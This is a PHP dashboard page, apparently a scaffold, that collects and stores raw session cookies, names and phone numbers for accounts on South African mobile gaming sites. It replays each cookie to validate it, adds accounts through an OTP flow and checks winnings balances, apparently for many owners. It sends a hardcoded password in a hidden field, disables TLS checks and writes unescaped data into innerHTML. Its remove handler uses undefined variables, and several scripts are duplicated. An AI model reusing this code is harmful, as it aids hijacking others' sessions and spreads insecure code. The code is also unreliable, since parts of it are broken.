<?php
session_start();
if (empty($_SESSION['user'])) {
  header('Location: login.php');
  exit;
}

$fileVoda = __DIR__ . '/data/cookies.json';
$fileMtn  = __DIR__ . '/data/cookies-mtn.json';
$fileMtn2 = __DIR__ . '/data/cookies-mtn2.json';
foreach ([$fileVoda,$fileMtn,$fileMtn2] as $f) { if (!file_exists($f)) file_put_contents($f, json_encode([], JSON_PRETTY_PRINT)); }


function loadCookies($path){
  $raw = file_get_contents($path);
  $arr = json_decode($raw, true);
  return is_array($arr) ? $arr : [];
}
function saveCookies($path, $arr){
  file_put_contents($path, json_encode($arr, JSON_PRETTY_PRINT|JSON_UNESCAPED_SLASHES));
}


function storeFileForDomain($domain){
  if ($domain === 'yellorush.co.za') return __DIR__ . '/data/cookies-mtn.json';
  if ($domain === 'rush-games-telkom.yellorush.co.za') return __DIR__ . '/data/cookies-mtn2.json';
  return __DIR__ . '/data/cookies.json';
}
/**
 * Fetch account info (name/phone) using a pasted cookie.
 * Adapts headers and referrer similar to user's working snippet.
 */
function fetchInfo($cookie, $url) {
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
    $headers = array(
        'Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7',
        'Accept-Language: en-US,en;q=0.9',
        'Cache-Control: no-cache',
        'Connection: keep-alive',
        'Cookie: ' . $cookie,
        'Pragma: no-cache',
        'Referer: ' . strtok($url, '?'),
        'Sec-Ch-Ua: "Not/A)Brand";v="8", "Chromium";v="126", "Google Chrome";v="126"',
        'Sec-Ch-Ua-Mobile: ?1',
        'Sec-Ch-Ua-Platform: "Android"',
        'Sec-Fetch-Dest: empty',
        'Sec-Fetch-Mode: navigate',
        'Sec-Fetch-Site: same-origin',
        'Upgrade-Insecure-Requests: 1',
        'User-Agent: Mozilla/5.0 (Linux; Android 13; Pixel 7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.0.0 Mobile Safari/537.36'
    );
    curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
    curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, false);

    $html = curl_exec($ch);
    curl_close($ch);

    $dom = new DOMDocument();
    @$dom->loadHTML($html);
    $xpath = new DOMXPath($dom);

    $phoneNode = $xpath->query("//span[contains(@class,'phone-cont')]");
    $phone = $phoneNode->length > 0 ? trim($phoneNode->item(0)->nodeValue) : '';

    $nameNode = $xpath->query("//div[contains(@class,'user-name-new')]//h6");
    $name = $nameNode->length > 0 ? trim($nameNode->item(0)->nodeValue) : '';

    return array('phone' => $phone, 'name' => $name);
}

// Flash-only simple gate for manual add route (matches your pattern)
$manual_password = 'flashkidd';

$notice = '';
$err = '';

// Handle add cookie (Paste + validate on site)
if ($_SERVER['REQUEST_METHOD']==='POST' && ($_POST['act'] ?? '')==='add_paste_validated') {
  if (!hash_equals($_SESSION['csrf'] ?? '', $_POST['csrf'] ?? '')) {
    $err = 'Invalid CSRF token';
  } else {
    // Require the per-action password like your working form
    $entered = trim($_POST['password'] ?? '');
    if ($entered !== $manual_password) {
      $err = 'Incorrect password';
    } else {
      $cookie = trim($_POST['cookie'] ?? '');
      $network = trim($_POST['network'] ?? '');
      $domain = trim($_POST['domain'] ?? '');
      $label = trim($_POST['label'] ?? '');
      if ($cookie==='' || $network==='' || $domain==='') {
        $err = 'Missing required fields';
      } else {
        // Choose the right URL per domain for validation (tab3 shows profile header)
        if ($domain === 'yellorush.co.za') {
          $url = 'https://www.yellorush.co.za/my-winnings?display=tab3';
        } elseif ($domain === 'gameplay.mzansigames.club') {
          $url = 'https://gameplay.mzansigames.club/my-winnings?display=tab3';
        } elseif ($domain === 'rush-games-telkom.yellorush.co.za') {
          $url = 'https://rush-games-telkom.yellorush.co.za/my-winnings?display=tab3';
        } else {
          $url = 'https://' . $domain . '/my-winnings?display=tab3';
        }

        // Validate cookie by scraping name/phone
        $info = fetchInfo($cookie, $url);
        if (!$info['name'] || !$info['phone']) {
          $err = 'Invalid cookie (could not read name/phone)';
        } else {
          // Load and check duplicates by cookie OR phone within same domain
          $storeFile = storeFileForDomain($domain);
          $list = loadCookies($storeFile);
          $dup = false;
          foreach ($list as $row) {
            if (($row['domain'] ?? '') === $domain) {
              if (($row['cookie'] ?? '') === $cookie || ($row['phone'] ?? '') === $info['phone']) {
                $dup = true; break;
              }
            }
          }
          if ($dup) {
            $err = 'Cookie/number already exists for this domain';
          } else {
            $list[] = [
              'id' => bin2hex(random_bytes(6)),
              'network' => $network,
              'domain' => $domain,
              'label' => $label,
              'cookie' => $cookie,
              'phone' => $info['phone'],
              'name' => $info['name'],
              'balance' => null,
              'created_at' => date('c'),
            ];
            saveCookies($storeFile, $list);
            $notice = sprintf('%s (%s) added.', htmlspecialchars($info['name']), htmlspecialchars($info['phone']));
          }
        }
      }
    }
  }
}

// Handle remove
if (($_GET['act'] ?? '')==='remove' && isset($_GET['id'])) {
  if (!hash_equals($_SESSION['csrf'] ?? '', $_GET['csrf'] ?? '')) {
    $err = 'Invalid CSRF token'; 
  } else {
    $id = $_GET['id'];
    $list = array_merge(loadCookies($fileVoda), loadCookies($fileMtn), loadCookies($fileMtn2));
    $before = count($list);
    $list = array_values(array_filter($list, fn($x)=> ($x['id'] ?? '') !== $id));
    saveCookies($storeFile, $list);
    $notice = $removed ? 'Removed 1 entry' : 'Not found';
  }
}

$list = array_merge(loadCookies($fileVoda), loadCookies($fileMtn), loadCookies($fileMtn2));
?><!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8">
  <meta name="viewport" content="width=device-width, initial-scale=1">
  <title>Y’ello Manager — Home</title>
  <link rel="stylesheet" href="assets/style.css">
</head>
<body>
  <div class="container">
    <div class="nav">
      <div class="brand">
        <div class="logo"></div>
        <div class="title">Y’ello Manager</div>
      </div>
      <div class="links">
        <a class="btn" href="#">Subscribe</a>
        <a class="btn" href="#">Scores</a>
        <a class="btn" href="#">Other</a>
        <a class="btn" href="#">Settings</a>
        <a class="btn" href="logout.php">Logout</a>
      </div>
    </div>

    <?php if ($notice): ?>
      <div class="card span-12" style="border-color:rgba(16,185,129,.35)">
        <div class="tag ok">OK</div>
        <div style="margin-top:6px"><?php echo $notice; ?></div>
      </div>
    <?php endif; ?>
    <?php if ($err): ?>
      <div class="card span-12" style="border-color:rgba(239,68,68,.35)">
        <div class="tag bad">Error</div>
        <div style="margin-top:6px"><?php echo $err; ?></div>
      </div>
    <?php endif; ?>

    <div class="grid">
      <div class="card span-6">
        <h2>Add Cookie (Validated)</h2>
        <form method="post" action="home.php">
          <input type="hidden" name="csrf" value="<?php echo htmlspecialchars($_SESSION['csrf']); ?>">
          <input type="hidden" name="act" value="add_paste_validated">

          <div class="row" style="margin:10px 0">
            <div class="col">
              <label class="small">Network</label>
              <select name="network" class="input" required>
                <option value="">Choose...</option>
                <option value="MTN">MTN</option>
                <option value="Vodacom">Vodacom</option>
                <option value="Telkom-MTN70">Telkom (MTN 70R)</option>
              </select>
            </div>
            <div class="col">
              <label class="small">Domain</label>
              <select name="domain" class="input" required>
                <option value="">Choose...</option>
                <option value="yellorush.co.za">yellorush.co.za</option>
                <option value="gameplay.mzansigames.club">gameplay.mzansigames.club</option>
                <option value="rush-games-telkom.yellorush.co.za">rush-games-telkom.yellorush.co.za</option>
              </select>
            </div>
          </div>

          <div style="margin:10px 0">
            <label class="small">Label (owner / notes) — optional</label>
            <input class="input" name="label" placeholder="e.g., John MTN 083...">
          </div>

          <div style="margin:10px 0">
            <label class="small">Cookie string</label>
            <textarea class="input" name="cookie" rows="5" placeholder="Paste full cookie header here" required></textarea>
          </div>

          <div class="row" style="margin:10px 0">
            <div class="col">
              <label class="small">Action password</label>
              <input class="input" type="password" name="password" value="flashkidd" hidden>
            </div>
          </div>

          <button class="btn primary" type="submit">Validate & Save</button>
        </form>
        <div class="small" style="margin-top:8px">We’ll GET <code>/my-winnings?display=tab3</code> on the chosen domain using this cookie. If name/phone are found, we store them and block duplicates (by cookie or phone per domain).</div>
      </div>

      
      <div class="card span-6">
        <h2>Add via Number & OTP</h2>
        <div class="small" style="margin-bottom:8px">Same flow for all domains — pick provider, we’ll send/verify OTP, then save cookie with name/phone.</div>

        <form id="otpForm" onsubmit="event.preventDefault()">
          <div class="row" style="margin:10px 0">
            <div class="col">
              <label class="small">Provider</label>
              <select class="input" id="provider" required>
                <option value="">Choose...</option>
                <option value="mtn">MTN (yellorush.co.za)</option>
                <option value="voda">Vodacom (gameplay.mzansigames.club)</option>
                <option value="mtn2">Telkom (rush-games-telkom.yellorush.co.za)</option>
              </select>
            </div>
            <div class="col">
              <label class="small">MSISDN</label>
              <input class="input" id="msisdn" placeholder="e.g., 0831234567">
            </div>
          </div>

          <div class="row" id="otpRow" style="display:none;margin:10px 0">
            <div class="col">
              <label class="small">OTP</label>
              <input class="input" id="otpCode" placeholder="Enter received OTP">
            </div>
          </div>

          <div class="row" style="gap:10px">
            <button class="btn" id="sendBtn" type="button" onclick="return sendOTPClick()">Send OTP</button>
            <button class="btn primary" id="verifyBtn" type="button" style="display:none">Verify & Save</button>
          </div>
        </form>
        <div class="small" id="otpMsg" style="margin-top:10px"></div>
      </div>


<script>
(function(){
  function $(s){ return document.querySelector(s); }
  async function callAPI(payload){
    const res = await fetch('api.php', {
      method:'POST', headers:{'Content-Type':'application/json'},
      credentials:'same-origin', body: JSON.stringify(payload)
    });
    return res.json();
  }
  async function render(){
    const r = await callAPI({action:'list'});
    const countEl = document.getElementById('cookieCount');
    if (countEl) countEl.textContent = (r && !r.error && Array.isArray(r.items)) ? r.items.length : 0;
    const tbody = document.querySelector('table.table tbody') || document.querySelector('tbody');
    if (!tbody) return;
    tbody.innerHTML = '';
    if (!r || r.error || !Array.isArray(r.items) || r.items.length===0){
      const tr = document.createElement('tr'); const td = document.createElement('td');
      td.colSpan = 9; td.className = 'small'; td.textContent = 'No cookies yet.';
      tr.appendChild(td); tbody.appendChild(tr); return;
    }
    r.items.forEach(function(row){
      const tr = document.createElement('tr');
      tr.innerHTML = ''
        + '<td><code>'+(row.id||'')+'</code></td>'
        + '<td>'+(row.network||'')+'</td>'
        + '<td>'+(row.domain||'')+'</td>'
        + '<td>'+(row.label||'')+'</td>'
        + '<td>'+(row.name||'')+'</td>'
        + '<td>'+(row.phone||'')+'</td>'
        + '<td class="small">'+(row.created_at||'')+'</td>'
        + '<td>'+(row.balance==null?'<span class="tag">unknown</span>':'<span class="tag ok">R'+row.balance+'</span>')+'</td>'
        + '<td>'
          + '<button class="btn btn-balance" data-phone="'+(row.phone||'')+'" data-domain="'+(row.domain||'')+'" data-id="${row.id||\'\'}">Check Balance</button> '
          + '<button class="btn btn-remove" data-id="'+(row.id||'')+'" data-file="'+((row.domain==='yellorush.co.za')?'cookies-mtn.json':((row.domain==='rush-games-telkom.yellorush.co.za')?'cookies-mtn2.json':'cookies.json'))+'">Remove</button>'
        + '</td>';
      tbody.appendChild(tr);
    });
  }
  document.addEventListener('click', async function(e){
    const rm = e.target.closest && e.target.closest('.btn.btn-remove');
    if (rm){
      e.preventDefault();
      const r = await callAPI({action:'remove', id: rm.dataset.id, file: rm.dataset.file});
      await render(); return;
    }
    const bal = e.target.closest && e.target.closest('.btn.btn-balance');
    if (bal){
      e.preventDefault();
      const domain = bal.dataset.domain || '';
      if (domain === 'gameplay.mzansigames.club'){ // Vodacom - not yet
        const td = bal.closest('tr').children[7];
        td.innerHTML = '<span class="tag">N/A</span>';
        return;
      }
      const digits = (bal.dataset.phone||'').replace(/\D+/g,'');
      const msisdn9 = digits.slice(-9);
      if (msisdn9.length!==9){ alert('No valid phone on this row'); return; }
      const r = await callAPI({action:'balance_mtn', msisdn9: msisdn9, domain});
      if (r.error){ alert(r.message||'Balance error'); return; }
      const td = bal.closest('tr').children[7];
      td.innerHTML = r.balance ? ('<span class="tag ok">R'+r.balance+'</span>') : '<span class="tag">N/A</span>';
      return;
    }
  });
  render();
})();
</script>


      </div>
        </form>
      </div>

      <div class="card span-12">
        <h2>Stored Cookies (<?php echo count($list); ?>)</h2>
        <table class="table">
          <thead>
            <tr>
              <th>ID</th>
              <th>Network</th>
              <th>Domain</th>
              <th>Label</th>
              <th>Name</th>
              <th>Phone</th>
              <th>Created</th>
              <th>Balance</th>
              <th>Actions</th>
            </tr>
          </thead>
          <tbody>
            <?php if (!count($list)): ?>
              <tr><td colspan="9" class="small">No cookies yet.</td></tr>
            <?php else: ?>
              <?php foreach ($list as $row): ?>
                <tr>
                  <td><code><?php echo htmlspecialchars($row['id']); ?></code></td>
                  <td><?php echo htmlspecialchars($row['network']); ?></td>
                  <td><?php echo htmlspecialchars($row['domain']); ?></td>
                  <td><?php echo htmlspecialchars($row['label'] ?? ''); ?></td>
                  <td><?php echo htmlspecialchars($row['name'] ?? ''); ?></td>
                  <td><?php echo htmlspecialchars($row['phone'] ?? ''); ?></td>
                  <td class="small"><?php echo htmlspecialchars($row['created_at']); ?></td>
                  <td>
                    <?php if (($row['balance'] ?? null)===null): ?>
                      <span class="tag">unknown</span>
                    <?php else: ?>
                      <span class="tag ok">R<?php echo htmlspecialchars((string)$row['balance']); ?></span>
                    <?php endif; ?>
                  </td>
                  <td>
                    <a class="btn" href="#">Check Balance</a>
                    <a class="btn" href="home.php?act=remove&id=<?php echo urlencode($row['id']); ?>&file=<?php echo ($row['domain']==='yellorush.co.za')?'cookies-mtn.json':(($row['domain']==='rush-games-telkom.yellorush.co.za')?'cookies-mtn2.json':'cookies.json'); ?>&csrf=<?php echo htmlspecialchars($_SESSION['csrf']); ?>" onclick="return confirm('Remove this cookie?')">Remove</a>
                  </td>
                </tr>
              <?php endforeach; ?>
            <?php endif; ?>
          </tbody>
        </table>
      </div>
    </div>

    <div class="footer">© <?php echo date('Y'); ?> Y’ello Manager — scaffold.</div>
  </div>


<script>
(function(){
  function $(s){ return document.querySelector(s); }
  async function callAPI(payload){
    const res = await fetch('api.php', {
      method:'POST', headers:{'Content-Type':'application/json'},
      credentials:'same-origin', body: JSON.stringify(payload)
    });
    return res.json();
  }
  async function render(){
    const r = await callAPI({action:'list'});
    const countEl = document.getElementById('cookieCount');
    if (countEl) countEl.textContent = (r && !r.error && Array.isArray(r.items)) ? r.items.length : 0;
    const tbody = document.querySelector('table.table tbody') || document.querySelector('tbody');
    if (!tbody) return;
    tbody.innerHTML = '';
    if (!r || r.error || !Array.isArray(r.items) || r.items.length===0){
      const tr = document.createElement('tr'); const td = document.createElement('td');
      td.colSpan = 9; td.className = 'small'; td.textContent = 'No cookies yet.';
      tr.appendChild(td); tbody.appendChild(tr); return;
    }
    r.items.forEach(function(row){
      const tr = document.createElement('tr');
      tr.innerHTML = ''
        + '<td><code>'+(row.id||'')+'</code></td>'
        + '<td>'+(row.network||'')+'</td>'
        + '<td>'+(row.domain||'')+'</td>'
        + '<td>'+(row.label||'')+'</td>'
        + '<td>'+(row.name||'')+'</td>'
        + '<td>'+(row.phone||'')+'</td>'
        + '<td class="small">'+(row.created_at||'')+'</td>'
        + '<td>'+(row.balance==null?'<span class="tag">unknown</span>':'<span class="tag ok">R'+row.balance+'</span>')+'</td>'
        + '<td>'
          + '<button class="btn btn-balance" data-phone="'+(row.phone||'')+'" data-domain="'+(row.domain||'')+'" data-id="${row.id||\'\'}">Check Balance</button> '
          + '<button class="btn btn-remove" data-id="'+(row.id||'')+'" data-file="'+((row.domain==='yellorush.co.za')?'cookies-mtn.json':((row.domain==='rush-games-telkom.yellorush.co.za')?'cookies-mtn2.json':'cookies.json'))+'">Remove</button>'
        + '</td>';
      tbody.appendChild(tr);
    });
  }
  document.addEventListener('click', async function(e){
    const rm = e.target.closest && e.target.closest('.btn.btn-remove');
    if (rm){
      e.preventDefault();
      const r = await callAPI({action:'remove', id: rm.dataset.id, file: rm.dataset.file});
      await render(); return;
    }
    const bal = e.target.closest && e.target.closest('.btn.btn-balance');
    if (bal){
      e.preventDefault();
      const domain = bal.dataset.domain || '';
      if (domain === 'gameplay.mzansigames.club'){ // Vodacom - not yet
        const td = bal.closest('tr').children[7];
        td.innerHTML = '<span class="tag">N/A</span>';
        return;
      }
      const digits = (bal.dataset.phone||'').replace(/\D+/g,'');
      const msisdn9 = digits.slice(-9);
      if (msisdn9.length!==9){ alert('No valid phone on this row'); return; }
      const r = await callAPI({action:'balance_mtn', msisdn9: msisdn9, domain});
      if (r.error){ alert(r.message||'Balance error'); return; }
      const td = bal.closest('tr').children[7];
      td.innerHTML = r.balance ? ('<span class="tag ok">R'+r.balance+'</span>') : '<span class="tag">N/A</span>';
      return;
    }
  });
  render();
})();
</script>



<!-- OTP WIRING: posts to otp.php -->
<script id="otp-wiring">
(function(){
  function $(s){ return document.querySelector(s); }
  let parsed = '', provider = '';

  async function callOTP(payload){
    const res = await fetch('otp.php', {
      method: 'POST',
      headers: {'Content-Type':'application/json'},
      credentials: 'same-origin',
      body: JSON.stringify(payload)
    });
    return res.json();
  }

  // global handler so inline onclick always works
  window.sendOTPClick = async function(){
    const sel = document.getElementById('provider');
    const msisdn = document.getElementById('msisdn');
    const msg = document.getElementById('otpMsg');
    const otpRow = document.getElementById('otpRow');
    const verifyBtn = document.getElementById('verifyBtn');

    if (!sel || !msisdn){ alert('OTP UI missing'); return false; }

    provider = sel.value;
    const phone = (msisdn.value||'').trim();

    if (!provider){ if (msg) msg.textContent = 'Choose provider'; return false; }
    if (!phone){ if (msg) msg.textContent = 'Enter MSISDN'; return false; }

    if (msg) msg.textContent = 'Sending OTP...';
    try{
      const r = await callOTP({ action:'send', provider, phone });
      if (r.error){ if (msg) msg.textContent = r.message; return false; }
      parsed = r.parsed || '';
      if (msg) msg.textContent = r.message || 'OTP sent';
      if (otpRow) otpRow.style.display = '';
      if (verifyBtn) verifyBtn.style.display = '';
    }catch(e){
      console.error(e);
      if (msg) msg.textContent = 'Network error while sending OTP';
    }
    return false;
  };

  document.addEventListener('click', async function(e){
    const btn = e.target && e.target.closest && e.target.closest('#verifyBtn');
    if (!btn) return;
    const otpCode = document.getElementById('otpCode');
    const msg = document.getElementById('otpMsg');
    const otp = (otpCode && otpCode.value || '').trim();
    if (!otp){ if (msg) msg.textContent = 'Enter OTP'; return; }

    if (msg) msg.textContent = 'Verifying...';
    try{
      const v = await callOTP({ action:'verify', provider, parsed, otp });
      if (v.error){
        if (msg) msg.textContent = v.message || 'OTP failed';
        if (v.raw) console.log('cookiejar raw:\\n' + v.raw);
        return;
      }
      if (msg) msg.innerHTML = (v.message||'Done') + '<br>Name: ' + (v.name||'') + ' | Phone: ' + (v.phone||'') + '<br><small>' + (v.domain||'') + '</small>';
      setTimeout(function(){ location.reload(); }, 1000);
    }catch(e){
      console.error(e);
      if (msg) msg.textContent = 'Network error while verifying OTP';
    }
  });
})();
</script>

</body>
</html>

<script>
(async function(){
  async function callAPI(payload){
    const r = await fetch('api.php', {method:'POST', headers:{'Content-Type':'application/json'}, body: JSON.stringify(payload)});
    return r.json();
  }
  async function refreshTable(){
    const r = await callAPI({action:'list'});
    const countEl = document.getElementById('cookieCount');
    if (countEl) countEl.textContent = r.error ? '0' : r.items.length;
  }
  refreshTable();
})();
</script>
